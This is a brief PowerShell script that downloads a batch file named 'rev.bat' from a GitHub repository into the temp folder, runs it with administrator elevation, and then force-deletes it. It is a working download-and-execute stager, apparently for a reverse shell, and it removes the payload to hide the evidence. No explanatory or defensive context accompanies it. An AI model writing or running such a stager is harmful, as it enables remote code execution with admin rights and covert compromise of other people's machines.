$url = "https://raw.githubusercontent.com/omarsamyX0/shell/main/rev.bat"
$outputFile = "$env:TEMP\rev.bat"
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath $outputFile -Wait -Verb RunAs
Remove-Item -Path $outputFile -Force
